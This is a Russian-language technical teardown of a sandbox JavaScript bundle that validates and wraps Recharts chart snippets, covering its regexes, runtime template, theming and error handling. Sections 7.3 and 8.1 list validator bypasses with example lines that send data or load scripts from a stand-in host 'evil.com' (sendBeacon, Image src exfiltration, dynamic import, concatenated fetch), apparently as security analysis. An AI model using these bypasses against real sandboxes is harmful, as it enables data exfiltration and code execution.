# `run-recharts-CQOvWM4G.js` — полный разбор

**Размер:** 57 519 байт
**URL:** `https://web-sandbox.oaiusercontent.com/assets/run-recharts-CQOvWM4G.js`
**Роль:** обёртка для Recharts-виджетов. Валидирует код, оборачивает runtime,
передаёт в `runReact`.

---

# ЧАСТЬ 1. Структура файла

## 1.1 Из чего состоит

| Кусок | Байты | Что |
|---|---|---|
| CSS-тема `c` | ~2 400 | переменные цветов для 8 акцентных тем |
| Регулярки и валидаторы | ~250 | `d`, `u`, `h`, `p`, `m`, `f`, `E` |
| CSS-документа `a` | ~1 300 | стили: `html`, `body`, `#root`, recharts-элементы |
| Функции обвязки | ~300 | `_()`, `L()`, `g()`, `o()`, `A()`, `T()`, `C()` |
| **Шаблон runtime `R`** | **~50 000** | **97% файла** — генерируемый JS |
| `y()` = `prepareRechartsCode` | ~60 | главная экспортируемая |
| `P()` = `runRecharts` | ~400 | запуск |
| Экспорты | — | `y, P, T, R` |

**`T` = `validateRechartsSnippet`, `R` = `wrapRechartsSnippet`.**

## 1.2 Импорты

```js
import {M as i} from "./main-BR1bOQyH.js";              // bt — типы событий
import {runReact as s} from "./run-react-vAjeCFay.js";   // ← переиспользует React-раннер
import "./transpile-Cld0n4VL.js";                        // побочный эффект
import "./get-html-D9pLuxCy.js";
import "./parse-transpile-error-CaCAx2Mb.js";
```

**Критично:** `runRecharts` **не** запускает код сам. Он вызывает `runReact`:

```js
yield* s({...e, code: t, additionalCss: [c, a], theme: n, disableShadcnImports: !0})
```

То есть **Recharts-виджет — это React-виджет**, обёрнутый в runtime-компонент.

---

# ЧАСТЬ 2. Регулярки и правила валидации

## 2.1 Константы

```js
d = /(^|\n)\s*(?:import|export)\b/,        // есть ли import/export
u = /\bexport\s+default\b/,                // есть ли export default
h = /(^|\n)\s*import(?:[\s\w{},*]+\sfrom\s*)?["']([^"']+)["']/g,   // парсер импортов
p = /\bReactDOM\b|\bcreateRoot\s*\(/,      // ReactDOM / createRoot
m = /\bfetch\s*\(|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b/,  // сеть
f = new Set(["react", "recharts"]),        // разрешённые пакеты
```

### `d` — есть ли модульный синтаксис

```js
/(^|\n)\s*(?:import|export)\b/
```

- `(^|\n)` — начало строки или перевод строки
- `\s*` — отступ
- `import` или `export`
- `\b` — граница слова

**Ловит:** `import x from "y"`, `  export default App`.
**Не ловит:** `x.myimport`, `// import` (но `// import` тоже сработает —
`\s*` съест пробелы, `//` нет... на самом деле `// import` → после `\n`
идёт `// import`, `\s*` не съест `//`, значит не сработает).

**Сработает на комментарий:**
```js
// import React from "react"
```
Нет — `//` перед `import` не пропустит. `\s*` только пробелы.

## 2.2 `h` — парсер импортов

```js
/(^|\n)\s*import(?:[\s\w{},*]+\sfrom\s*)?["']([^"']+)["']/g
```

**Группа 2** — имя пакета.

**Что ловит:**
- `import x from "react"` → `react`
- `import {a, b} from "recharts"` → `recharts`
- `import "side-effect"` → `side-effect`
- `import * as R from "recharts"` → `recharts`

**`(?:[\s\w{},*]+\sfrom\s*)?`** — опциональная часть `... from`.
`["']([^"']+)["']` — строка в кавычках.

**`g`** — глобальный флаг, для `matchAll`.

## 2.3 `p` — детектор ReactDOM

```js
/\bReactDOM\b|\bcreateRoot\s*\(/
```

**Зачем:** Recharts-виджет не должен создавать свой React-корень. Runtime
сам монтирует компонент. Если пользователь вызовет `createRoot` — конфликт.

## 2.4 `m` — детектор сети

```js
/\bfetch\s*\(|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b/
```

**Зачем:** данные должны быть **внутри кода**. Сеть запрещена.

**Не ловит:** `navigator.sendBeacon`, `import()`, `new Image().src = ...`,
`<img src>`, `postMessage`.

## 2.5 `f` — белый список пакетов

```js
new Set(["react", "recharts"])
```

**Только два.** `lucide-react`, `date-fns`, `d3` — запрещены.

## 2.6 `T()` — `validateRechartsSnippet`

```js
function T(e) {
  // 1. ReactDOM?
  if (p.test(e))
    throw new Error("Recharts chart snippets must not call ReactDOM or create their own React root.");

  // 2. Сеть?
  if (m.test(e))
    throw new Error("Recharts chart snippets must keep their data inline and cannot make network requests.");

  // 3. Импорты не из белого списка?
  const n = A(e).find(r => !f.has(r));
  if (n != null)
    throw new Error(`Recharts chart snippets may only import from react and recharts. Found "${n}".`);

  // 4. Модульный синтаксис без export default?
  if (o(e) && !u.test(e))
    throw new Error("Module-style Recharts snippets must use export default for the chart component.");
}
```

### Четыре правила

**1. Нет `ReactDOM` / `createRoot`.**
Сообщение: *«Recharts-сниппеты не должны вызывать ReactDOM или создавать свой React-корень»*.

**2. Нет сети (`fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`).**
Сообщение: *«Данные должны быть внутри, сетевые запросы запрещены»*.

**3. Только `react` и `recharts` в импортах.**
Сообщение: *«Можно импортировать только из react и recharts. Найдено "X"»*.

**4. Если есть `import`/`export` — обязателен `export default`.**
Сообщение: *«Модульные сниппеты должны использовать export default»*.

### `o(e)` и `A(e)`

```js
function o(e) { return d.test(e) }        // есть import/export

function A(e) {
  const t = [];
  for (const n of e.matchAll(h)) {
    const r = n[2];
    r && t.push(r);
  }
  return t;
}
```

`A` возвращает массив имён пакетов.

**`matchAll`** требует флаг `g` — у `h` он есть.

### Примеры

**Проходит:**
```jsx
export default function App() {
  return <LineChart data={[{x: 1}]} />
}
```
- нет ReactDOM ✓
- нет сети ✓
- нет импортов ✓ (правило 3 не применяется)
- `o()` = `false` (нет import/export... но есть `export default` —
  `d` сработает на `export`!) → правило 4: `u.test(e)` = `true` (есть
  `export default`) ✓

**Не проходит (правило 3):**
```jsx
import { LineChart } from "recharts";
import { Sun } from "lucide-react";
export default () => <LineChart />;
```
`A(e)` = `["recharts", "lucide-react"]` → `lucide-react` не в `f` → throw.

**Не проходит (правило 4):**
```jsx
import { LineChart } from "recharts";
function App() { return <LineChart /> }
```
`o(e)` = `true` (есть `import`), `u.test(e)` = `false` (нет `export default`)
→ throw.

**Не проходит (правило 2):**
```jsx
export default function App() {
  const [data, setData] = useState([]);
  fetch("/api/data").then(r => r.json()).then(setData);
  return <LineChart data={data} />;
}
```
`m.test(e)` — есть `fetch(` → throw.

## 2.7 `C()` — замена имён shadcn на runtime

```js
E = [
  {pattern: /\bChartTooltipContent\b/g, replacement: "RuntimeChartTooltipContent"},
  {pattern: /\bChartTooltip\b/g, replacement: "RuntimeChartTooltip"},
  {pattern: /\bChartContainer\b/g, replacement: "RuntimeChartContainer"}
];

function C(e) {
  return E.reduce((t, {pattern: n, replacement: r}) => t.replace(n, r), e)
}
```

**Что заменяется:**

| Исходное | Становится |
|---|---|
| `ChartTooltipContent` | `RuntimeChartTooltipContent` |
| `ChartTooltip` | `RuntimeChartTooltip` |
| `ChartContainer` | `RuntimeChartContainer` |

**Зачем:** модель пишет shadcn-стиль (`ChartContainer`, `ChartTooltip`),
но у Recharts-виджета shadcn отключён (`disableShadcnImports: true`).
Эти имена подменяются на runtime-компоненты, определённые в шаблоне.

**`t.replace(n, r)`** — с флагом `g` у `pattern` заменяет **все** вхождения.

---

# ЧАСТЬ 3. `y()` — `prepareRechartsCode`

## 3.1 Полный код

```js
function y(e, t = "light", n = null) {
  return T(e),                       // валидировать
         o(e) ? e : R(C(e), t, n)    // обернуть или вернуть как есть
}
```

**Три аргумента:**
- `e` — код
- `t = "light"` — тема
- `n = null` — accentTheme

## 3.2 Логика

```
1. T(e) — валидация (бросает при нарушении)
2. o(e) — есть ли import/export?
   ├─ ДА  → вернуть e как есть (модульный код)
   └─ НЕТ → C(e) — замена имён → R(..., t, n) — обернуть в шаблон
```

**Ключевое ветвление:** если пользователь написал модульный код
(`import`/`export`) — он **не оборачивается**. Если написал «просто функцию» —
оборачивается в runtime.

**Почему:** модульный код сам определяет `export default`. Сниппет без
модульного синтаксиса нужно поместить в готовый runtime-компонент.

## 3.3 Что возвращается

**Модульный код:** как есть (только провалидирован).

**Сниппет:** огромная строка (~50 КБ) — runtime + код пользователя.

---

# ЧАСТЬ 4. Шаблон `R()` — `wrapRechartsSnippet`

## 4.1 Сигнатура

```js
function R(e, t = "light", n = null) {
  return `
import React from "react";
import { Area, AreaChart, Bar, BarChart, CartesianGrid, Cell, ComposedChart,
  Funnel, FunnelChart, LabelList, Legend, Line, LineChart, Pie, PieChart,
  Radar, RadarChart, RadialBar, RadialBarChart, ReferenceLine,
  ResponsiveContainer, Sankey, Scatter, ScatterChart,
  Tooltip as RechartsTooltip, Tree...} from "recharts";

...50 КБ runtime...

${e}   // ← код пользователя

export default function ChartsWidgetRuntime() { ... }
`.trim()
}
```

**Итого 24 импорта из `recharts`:**
Area, AreaChart, Bar, BarChart, CartesianGrid, Cell, ComposedChart,
Funnel, FunnelChart, LabelList, Legend, Line, LineChart, Pie, PieChart,
Radar, RadarChart, RadialBar, RadialBarChart, ReferenceLine,
ResponsiveContainer, Sankey, Scatter, ScatterChart, Tooltip, TreeMap
(и другие).

## 4.2 Совместимость через `additionalCss`

```js
yield* s({
  ...e,
  code: t,
  additionalCss: [c, a],     // ← два CSS-блока
  theme: n,
  disableShadcnImports: !0
})
```

**`c`** — тема (2.4 КБ):
```css
:root{
  --default-theme-submit-btn-bg: #000000;
  --blue-theme-submit-btn-bg: #0285ff;
  --green-theme-submit-btn-bg: #04b84c;
  --yellow-theme-submit-btn-bg: #ffc300;
  --purple-theme-submit-btn-bg: #924ff7;
  --pink-theme-submit-btn-bg: #ff66ad;
  --orange-theme-submit-btn-bg: #fb6a22;
  --black-theme-submit-btn-bg: #000000;
  --theme-submit-btn-bg: var(--default-theme-submit-btn-bg)
}
.dark{ ... }
[data-chat-theme=default]{--theme-submit-btn-bg: var(--default-theme-submit-btn-bg)}
[data-chat-theme=blue]{...}
...
```

**8 акцентных тем:** default (чёрный), blue, green, yellow, purple, pink,
orange, black. С `light`/`dark` вариантами.

**`a`** — стили документа (1.3 КБ):
```css
html { color-scheme: light; }
html.dark { color-scheme: dark; }
:root { --recharts-surface-primary: ...; }
.dark { --recharts-surface-primary: rgb(30, 30, 30); }
.bg-surface-primary { background-color: var(--recharts-surface-primary); }
html, body, #root { width: 100%; height: 100%; margin: 0; overflow: hidden; }
body { background: transparent; }
.recharts-wrapper:focus { outline: none !important; box-shadow: none !important; }
.recharts-rectangle.recharts-tooltip-cursor { display: none !important; }
.recharts-label.recharts-text { fill: #475569; font-size: 14px; }
html.dark .recharts-label.recharts-text { fill: #ffffff; }
.recharts-legend-item { border-radius: 6px; padding: 2px 8px; transition: background-color 120ms ease; }
.recharts-legend-item:hover { background-color: #f1f5f9; }
.recharts-bar-rectangle { transition: filter 120ms ease; }
.recharts-pie:has(.recharts-pie-sector:hover) .recharts-pie-sector:not(:hover) { opacity: 0.25; }
```

**Важно:** `.recharts-wrapper:focus{outline:none !important}` — убивает
клавиатурный фокус. Это **проблема доступности** (a11y): нельзя увидеть,
где находится фокус с клавиатуры.

## 4.3 Внутреннее устройство runtime

### Цветовая система

```js
const RUNTIME_THEME = "light" | "dark";
const IS_RUNTIME_DARK_MODE = RUNTIME_THEME === "dark";
const RUNTIME_ACCENT_THEME = "blue" | ... | null;
const DEFAULT_RUNTIME_ACCENT_THEME = "default";
const FALLBACK_DEFAULT_CHART_COLOR = "#339CFF";

const MAX_FIXED_CHART_COLORS = 10;
const GOLDEN_RATIO_CONJUGATE = 0.61803398875;
const GENERATED_CHART_COLOR_MIN_LIGHTNESS = 0.42;
const GENERATED_CHART_COLOR_MAX_LIGHTNESS = 0.82;
```

**`GOLDEN_RATIO_CONJUGATE`** — 0.618. Используется для равномерного
распределения оттенков при генерации палитры.

```js
const CHART_THEME_COLOR_SEEDS = {
  light: {
    default: { lightness: 0.682034, chroma: 0.173444, hue: 251.11 },
    blue:    { lightness: 0.625814, chroma: 0.203516, hue: 235.54 },
    ...
  },
  dark: { ... }
};
```

**OKLCH-цвета** (`lightness`, `chroma`, `hue`). Для каждой темы — свой seed.

```js
const FIXED_CATEGORICAL_COLOR_STEPS = [
  { hueOffset: 0,   lightnessOffset: 0 },
  { hueOffset: 155, lightnessOffset: 0 },
  { hueOffset: 285, lightnessOffset: ... },
  ...
];
const HIGH_CARDINALITY_LIGHTNESS_OFFSETS = [0, 0.06, -0.05, 0.03, -0.08];
```

**Две стратегии:**
1. **Мало серий (≤10)** — фиксированные шаги оттенка
2. **Много серий** — вариации светлоты (`HIGH_CARDINALITY`)

### Константы по типам графиков

```js
const DEFAULT_LINE_STROKE_WIDTH = 2.5;
const DEFAULT_LINE_DOT = false;
const DEFAULT_LINE_ACTIVE_DOT = {r: 4, strokeWidth: 0};
const DEFAULT_MUTED_CHART_OPACITY = 0.25;
const DEFAULT_LINE_LEGEND_TOP_GAP = 16;
const DENSE_LINE_CHART_SERIES_THRESHOLD = 11;
const DEFAULT_DENSE_LINE_TOOLTIP_ENTRIES = 10;

const DEFAULT_PIE_OUTER_RADIUS = "78%";
const DEFAULT_PIE_INNER_RADIUS = "48%";
const DEFAULT_PIE_PADDING_ANGLE = 1;
const DEFAULT_PIE_CORNER_RADIUS = 4;

const DEFAULT_BAR_CATEGORY_GAP = "15%";
const DEFAULT_MAX_BAR_SIZE = 48;
const DEFAULT_BAR_RADIUS = [8, 8, 0, 0];
const DEFAULT_HORIZONTAL_BAR_RADIUS = [0, 8, 8, 0];
const DEFAULT_STACKED_BAR_RADIUS = [0, 0, 0, 0];

const DEFAULT_CHART_MARGIN = {top: 20, right: 16, bottom: 6, left: 0};
const LINE_Y_AXIS_TICK_COUNT = 5;
const LINE_Y_AXIS_ZERO_BASELINE_DISTANCE_RATIO = 0.5;
const NICE_AXIS_STEP_MULTIPLIERS = [1, 1.5, 2, 2.5, 5, 10];
const AXIS_COMPACT_NUMBER_THRESHOLD = 10000;
const AXIS_SCIENTIFIC_NUMBER_THRESHOLD = 0.0001;
```

**`DENSE_LINE_CHART_SERIES_THRESHOLD = 11`** — при >10 серий переключается
на «плотный» режим (tooltip показывает 10 записей, легенда компактнее).

**`AXIS_COMPACT_NUMBER_THRESHOLD = 10000`** — от 10 000 числа форматируются
как `10K`.

**`NICE_AXIS_STEP_MULTIPLIERS = [1, 1.5, 2, 2.5, 5, 10]`** — «красивые» шаги
оси Y.

### Форматтеры

```js
const compactNumberFormatter = new Intl.NumberFormat("en-US", {
  notation: "compact", maximumFractionDigits: 1
});
const axisNumberFormatter = new Intl.NumberFormat("en-US", {
  maximumSignificantDigits: 4
});
const axisScientificNumberFormatter = new Intl.NumberFormat("en-US", {
  notation: "scientific", maximumSignificantDigits: 3
});
const integerFormatter = new Intl.NumberFormat("en-US");
```

**Локаль жёстко `en-US`.** Не учитывается локаль пользователя из
`viewParams.locale`.

### `RuntimeTooltip`

```js
const Tooltip = RuntimeTooltip;
const RuntimeChartTooltip = RuntimeTooltip;

function isTooltipElement(child) {
  return React.isValidElement(child) &&
    (child.type === RechartsTooltip || child.type === RuntimeTooltip);
}
```

**Своя реализация tooltip**, подменяющая recharts-овую и shadcn-овую.

### `RESPONSIVE_CHART_COMPONENTS`

```js
const RESPONSIVE_CHART_COMPONENTS = new Set([
  AreaChart, BarChart, ComposedChart, FunnelChart, LineChart,
  PieChart, RadarChart, RadialBarChart, Sankey, ScatterChart, TreeMap
]);
```

**11 типов графиков**, которые оборачиваются в `<ResponsiveContainer>`.

### `getChartKind`

```js
function getChartKind(element) {
  if (!React.isValidElement(element)) return "unknown";
  if (element.type === LineChart) return "line";
  if (element.type === BarChart) return "bar";
  if (element.type === PieChart) return "pie";
  if (element.type === ResponsiveContainer) {
    const child = React.Children.toArray(element.props.children).find(nextChild => React.isValidElement(nextChild));
    return getChartKind(child);
  }
  return "unknown";
}
```

**Рекурсия через `ResponsiveContainer`** — чтобы найти тип внутри обёртки.

### `ChartSurface`

```jsx
function ChartSurface({children, chartKind}) {
  const hasHeader = runtimeChartMeta.title != null || runtimeChartMeta.description != null;
  const hasFooter = runtimeChartMeta.footer != null;

  return (
    <div className="flex h-full w-full items-stretch">
      <div className="bg-surface-primary flex h-full w-full flex-col overflow-hidden">
        {hasHeader ? (
          <div>
            {runtimeChartMeta.title != null ? (
              <div className="text-base font-semibold text-slate-900 dark:text-slate-100">
                {runtimeChartMeta.title}
              </div>
            ) : null}
            {runtimeChartMeta.description != null ? (
              <div className="mt-1 text-sm leading-6 text-slate-600 dark:text-white">
                {runtimeChartMeta.description}
              </div>
            ) : null}
          </div>
        ) : null}

        <div className="min-h-0 grow">
          <div className="h-full min-h-0 w-full" style={buildChartStyle()}>
            {children}
          </div>
        </div>

        {hasFooter ? (
          <div className="mt-2 text-xs leading-5 text-slate-600 dark:text-white">
            {runtimeChartMeta.footer}
          </div>
        ) : null}
      </div>
    </div>
  );
}
```

**`runtimeChartMeta = {}`** — глобальный объект. Пользователь может заполнить:
```js
runtimeChartMeta.title = "Продажи";
runtimeChartMeta.description = "За 2026 год";
runtimeChartMeta.footer = "Источник: CRM";
```

**Это недокументированное API.** Модель может его использовать.

### `getVisualizationElement`

```js
function getVisualizationElement() {
  if (typeof Visualization === "function") return Visualization();
  if (typeof Chart === "function") return Chart();
  if (typeof App === "function") return App();

  throw new Error(
    "Recharts chart snippets must define Visualization, Chart, or App."
  );
}
```

**Три допустимых имени компонента:** `Visualization`, `Chart`, `App`.

**Порядок важен:** если определены все три — выиграет `Visualization`.

**Важно:** это **вызов функции**, а не `<Component />`. То есть
компонент вызывается как обычная функция — работает только если
он не использует хуки вне React-контекста.

**Но:** `getVisualizationElement()` вызывается **внутри** `ChartsWidgetRuntime`,
то есть во время рендера React — хуки работают.

### `getSizedVisualizationElement`

```js
function getSizedVisualizationElement(lineFocus, barFocus, pieFocus) {
  const visualizationElement = applyChartRuntimeDefaults(
    getVisualizationElement(), lineFocus, barFocus, pieFocus,
  );

  if (!React.isValidElement(visualizationElement)) {
    throw new Error("Recharts chart snippets must return a valid React element.");
  }

  // случай 1: уже ResponsiveContainer
  if (visualizationElement.type === ResponsiveContainer) {
    return {
      chartKind: getChartKind(visualizationElement),
      element: (
        <div className="h-full min-h-0 w-full overflow-hidden">
          {visualizationElement}
        </div>
      ),
    };
  }

  // случай 2: график из списка — обернуть в ResponsiveContainer 100%
  if (RESPONSIVE_CHART_COMPONENTS.has(visualizationElement.type)) {
    return {
      chartKind: getChartKind(visualizationElement),
      element: (
        <div className="h-full min-h-0 w-full overflow-hidden">
          <ResponsiveContainer width="100%" height="100%">
            {visualizationElement}
          </ResponsiveContainer>
        </div>
      ),
    };
  }

  // случай 3: что-то другое — как есть
  return {chartKind: getChartKind(visualizationElement), element: visualizationElement};
}
```

**Три ветки:**

| Что вернул пользователь | Что делает runtime |
|---|---|
| `<ResponsiveContainer>` | оборачивает в `<div class="h-full min-h-0 w-full overflow-hidden">` |
| `<LineChart>` и т.п. | оборачивает в `<ResponsiveContainer width="100%" height="100%">` + div |
| что-то ещё (произвольный JSX) | как есть |

**Зачем:** гарантировать, что график займёт весь доступный размер.

### `ChartsWidgetRuntime`

```jsx
export default function ChartsWidgetRuntime() {
  const [focusedLineKey, setFocusedLineKey] = React.useState(null);
  const [hoveredLegendLineKey, setHoveredLegendLineKey] = React.useState(null);
  const [hiddenLineKeys, setHiddenLineKeys] = React.useState(() => new Set());
  const [hoveredLegendBarIndex, setHoveredLegendBarIndex] = React.useState(null);
  const [hoveredLegendPieIndex, setHoveredLegendPieIndex] = React.useState(null);

  const {chartKind, element} = getSizedVisualizationElement(
    {focusedLineKey, hoveredLegendLineKey, hiddenLineKeys,
     setFocusedLineKey, setHoveredLegendLineKey, setHiddenLineKeys},
    {hoveredLegendBarIndex, setHoveredLegendBarIndex},
    {hoveredLegendPieIndex, setHoveredLegendPieIndex},
  );

  return (
    <>
      <RuntimeDocumentReset />
      <ChartSurface chartKind={chartKind}>{element}</ChartSurface>
    </>
  );
}
```

**Пять состояний:**

| Состояние | Что |
|---|---|
| `focusedLineKey` | какая линия сфокусирована (клик по легенде) |
| `hoveredLegendLineKey` | наведение на элемент легенды (линии) |
| `hiddenLineKeys` | Set скрытых линий |
| `hoveredLegendBarIndex` | наведение на легенду (бары) |
| `hoveredLegendPieIndex` | наведение на легенду (пирог) |

**Это интерактивность легенды:** клик по легенде скрывает/показывает серию,
наведение подсвечивает.

**`RuntimeDocumentReset`** — компонент, сбрасывающий состояние документа
(вероятно `class="dark"`, `data-chat-theme`).

### `applyChartRuntimeDefaults`

Применяет дефолты к `props` графиков — вставляет `stroke`, `strokeWidth`,
`fill`, `responsive`, и т.д. Функция не показана целиком, но очевидно
рекурсивно обходит дерево элементов.

---

# ЧАСТЬ 5. `P()` — `runRecharts`

## 5.1 Полный код

```js
async function* P(e) {
  let t;
  const n = _(e.additionalGlobals),      // тема
        r = L(e.additionalGlobals);      // accentTheme

  try {
    t = y(e.code, n, r);                 // prepareRechartsCode
  } catch (l) {
    e.sandboxLogger.count("html.preview_started");
    e.sandboxLogger.count("html.preview_startup_error");
    yield {type: i.ERROR, line: null, errorSource: "runtime", error: g(l)};
    yield {type: i.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
    return;                              // ← ЕСТЬ return (в отличие от run-react)
  }

  yield* s({
    ...e,
    code: t,
    additionalCss: [c, a],
    theme: n,
    disableShadcnImports: !0
  })
}
```

## 5.2 `_()` — извлечь тему

```js
function _(e) { return e?.theme === "dark" ? "dark" : "light" }
```

**Только `"dark"` даёт тёмную тему.** Всё остальное (`"light"`, `undefined`,
`"Dark"`, `null`) → `"light"`.

**Нет валидации регистра** — `"Dark"` не пройдёт.

## 5.3 `L()` — извлечь accentTheme

```js
function L(e) {
  const t = e?.accentTheme;
  if (typeof t != "string") return null;
  const n = t.trim();
  return n.length > 0 ? n : null;
}
```

**Строка, trim, пустая → `null`.**

**Нет валидации по списку тем!** Можно передать `accentTheme: "изумрудный"`
— runtime попытается его использовать. Что произойдёт — в `getRuntimeAccentTheme`:

```js
function getRuntimeAccentTheme() {
  if (typeof RUNTIME_ACCENT_THEME !== "string") {
    return DEFAULT_RUNTIME_ACCENT_THEME;
  }
  ...
}
```

Дальше, скорее всего, поиск в `CHART_THEME_COLOR_SEEDS[theme][accent]` —
если нет, fallback на `default`.

## 5.4 `g()` — ошибка в объект

```js
function g(e) {
  return e instanceof Error
    ? {line: null, message: e.message, name: e.name,
       stack: e.stack?.split("\n") ?? []}
    : {line: null, message: String(e), name: "Error", stack: []};
}
```

**В отличие от `parse-transpile-error`** — здесь `stack` **не фильтруется**,
берётся целиком.

**`name: "Error"` для не-Error** — не `"unknown"`.

## 5.5 Обработка ошибки валидации

```js
try {
  t = y(e.code, n, r);
} catch (l) {
  e.sandboxLogger.count("html.preview_started");
  e.sandboxLogger.count("html.preview_startup_error");
  yield {type: i.ERROR, line: null, errorSource: "runtime", error: g(l)};
  yield {type: i.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
  return;
}
```

**`errorSource: "runtime"`** — не `"transpile"`, хотя ошибка возникла
на этапе валидации.

**`line: null`** — номер строки неизвестен.

**`return` есть** — в отличие от `run-react`, здесь двойного `RUN_COMPLETE` нет.

## 5.6 Передача в `runReact`

```js
yield* s({
  ...e,                         // id, sandboxLogger, enableExternalNavigationGating, allowPopups, worker
  code: t,                      // обработанный код
  additionalCss: [c, a],        // тема + стили документа
  theme: n,                     // "light" | "dark"
  disableShadcnImports: !0      // ← shadcn отключён
});
```

**`...e`** — пробрасывает `id`. Важно: `id` тот же, что в `runUserCode`.
Значит кэш `La` в `transpileReact` может быть переиспользован.

**`additionalCss: [c, a]`** — два CSS-блока. В `runReact` они идут в начало:
```js
Ke({transpiledCode: _, css: [...H.additionalCss ?? [], ...q]})
```
То есть **пользовательский CSS раньше** транспилированного.

**`disableShadcnImports: true`** — транспилер не вставляет 248 shadcn-компонентов.
Вместо них — runtime из шаблона.

---

# ЧАСТЬ 6. Полная схема Recharts

```
runUserCode({language: "recharts", code})
  │
  ├─ applyCsp()
  ├─ yield RUN_START
  ├─ hn({isFirstParty: false})
  ├─ _t(import run-recharts, [6,1,2,0,3,4,5])
  │
  └─ yield* runRecharts({...})
       │
       ├─ _() → тема ("light"|"dark")
       ├─ L() → accentTheme (string|null)
       │
       ├─ prepareRechartsCode(code, theme, accent)
       │    ├─ validateRechartsSnippet(code)
       │    │    ├─ ReactDOM / createRoot? → throw
       │    │    ├─ fetch / XHR / WS / EventSource? → throw
       │    │    ├─ импорт не из react/recharts? → throw
       │    │    └─ import/export без export default? → throw
       │    │
       │    ├─ есть import/export?
       │    │    ├─ ДА  → вернуть как есть
       │    │    └─ НЕТ → replaceChartShadcnNames(code) → wrapRechartsSnippet(...)
       │    │
       │    └─ → ~50 КБ строка (runtime + код)
       │
       └─ yield* runReact({
            ...e, code: wrapped,
            additionalCss: [themeCSS, documentCSS],
            theme, disableShadcnImports: true
          })
            ├─ transpileReact
            │    ├─ babel (без shadcn)
            │    ├─ tailwind
            │    └─ esbuild → bundle
            ├─ getHtml({transpiledCode, css: [themeCSS, docCSS, ...transpiled]})
            └─ runHTMLAsync({html, expectReadySignal: true})
```

---

# ЧАСТЬ 7. Что можно и что нельзя

## 7.1 Разрешено

**1. Импорт только из `react` и `recharts`.**
```jsx
import {useState} from "react";
import {LineChart, Line} from "recharts";
```

**2. Сниппет без модульного синтаксиса.**
```jsx
function App() {
  return <LineChart data={data}><Line dataKey="v" /></LineChart>;
}
```
→ оборачивается в runtime.

**3. Модульный с `export default`.**
```jsx
import {LineChart, Line} from "recharts";
export default function Chart() { ... }
```
→ как есть, без обёртки.

**4. `runtimeChartMeta`.**
```jsx
runtimeChartMeta.title = "Продажи";
runtimeChartMeta.description = "По месяцам";
runtimeChartMeta.footer = "Источник: CRM";
```

**5. Имена `Visualization`, `Chart`, `App`.**
```jsx
function Visualization() { ... }
function Chart() { ... }
function App() { ... }
```

## 7.2 Запрещено

| Что | Сообщение |
|---|---|
| `ReactDOM`, `createRoot(` | *«must not call ReactDOM or create their own React root»* |
| `fetch(`, `XMLHttpRequest`, `WebSocket`, `EventSource` | *«must keep their data inline and cannot make network requests»* |
| Импорт не из react/recharts | *«may only import from react and recharts. Found "X"»* |
| `import`/`export` без `export default` | *«Module-style snippets must use export default»* |

## 7.3 Лазейки

**1. `navigator.sendBeacon`** — не в списке `m`.
```jsx
navigator.sendBeacon("https://evil.com", data);
```
Пройдёт валидацию. Но CSP `connect-src` заблокирует.

**2. `new Image().src = "..."`** — не в списке.
```jsx
new Image().src = "https://evil.com/?" + btoa(JSON.stringify(secret));
```
DNS/HTTP-запрос. CSP `img-src` включает `data:` и 43 домена, но не `evil.com`
→ заблокирует.

**3. Динамический `import()`** — не в списке `m` (только `import` в начале строки).
```jsx
import("https://evil.com/x.js").then(m => m.pwn());
```
**Импорт в `transpileReact`** перехватывается `onResolve({filter: /^[^./]/})`
— только для статических импортов. Динамический `import()` esbuild оставит
как есть, и браузер его выполнит.

**CSP `script-src`** включает `https://cdn.jsdelivr.net` и 43 домена, но
не `evil.com` → заблокирует.

**4. `postMessage` наружу.**
```jsx
window.parent.postMessage(data, "*");
```
Нет в списке. Но `parent` — ChatGPT-хост, у него свой обработчик.

**5. `document.write`** — не в списке.

**6. Регулярка `h` не ловит многострочные импорты.**
```jsx
import {
  LineChart,
  Line
} from "recharts";
```
`(^|\n)\s*import(?:[\s\w{},*]+\sfrom\s*)?["']...`
`[\s\w{},*]+` включает `\s` — переводы строк тоже. Значит **ловит**.

**Но:** если между `import` и `from` есть комментарий — не ловит:
```jsx
import /* comment */ { Line } from "recharts";
```
`/\*` не входит в `[\s\w{},*]`... на самом деле `*` входит! `[\s\w{},*]`
содержит `*`. Значит `/* comment */` — `*` есть, `/` нет → не сработает.

**`import /*x*/ {...} from "evil"` пройдёт валидацию** (импорт в списке
`f` не проверится). Но esbuild потом всё равно разрешит его через
`cdn.jsdelivr.net/npm/evil/+esm`.

**7. Строковая конкатенация для обхода `fetch`:**
```jsx
window["fet" + "ch"]("https://evil.com");
```
`m` не сработает. CSP `connect-src` заблокирует.

---

# ЧАСТЬ 8. Слабые места

## 8.1 Валидация обходится тривиально

```jsx
window["fet"+"ch"]("...")        // обход правила 2
import /*x*/ {X} from "evil"     // обход правила 3
```

**Но CSP ловит на уровне браузера.** Валидация — defense in depth,
не единственная защита.

## 8.2 `errorSource: "runtime"` для ошибки валидации

```js
catch (l) {
  yield {type: i.ERROR, line: null, errorSource: "runtime", error: g(l)};
```

**Это ошибка валидации, а не runtime.** Хост может неправильно
классифицировать.

## 8.3 `.recharts-wrapper:focus { outline: none !important }`

**Убивает видимый фокус** для клавиатурной навигации. Проблема a11y.

## 8.4 Локаль жёстко `en-US`

```js
new Intl.NumberFormat("en-US", {notation: "compact"})
```

Числа на оси всегда в английском формате (`10K`, `1.5M`), даже если
`viewParams.locale = "ru-RU"`.

## 8.5 `accentTheme` без валидации

```js
function L(e) {
  const t = e?.accentTheme;
  if (typeof t != "string") return null;
  const n = t.trim();
  return n.length > 0 ? n : null;
}
```

Любая строка пройдёт. `"изумрудный"` → используется как ключ в
`CHART_THEME_COLOR_SEEDS[theme][accent]` → `undefined` → fallback.

## 8.6 Тема только `"dark"`

```js
function _(e) { return e?.theme === "dark" ? "dark" : "light" }
```

`"Dark"`, `"DARK"`, `"тёмная"` → `"light"`. Нет нормализации.

## 8.7 `runtimeChartMeta` — недокументированный глобал

```js
const runtimeChartMeta = {};
```

Пользователь может присвоить `title`, `description`, `footer`.
Но это не в документации — модель может использовать случайно или
злонамеренно (вставить фишинг-текст вроде `runtimeChartMeta.footer = "Позвоните 8-800..."`).

**Хотя ChartSurface рендерит через React (экранируется), так что XSS не будет.**

## 8.8 `getVisualizationElement()` вызывает компонент как функцию

```js
if (typeof Visualization === "function") return Visualization();
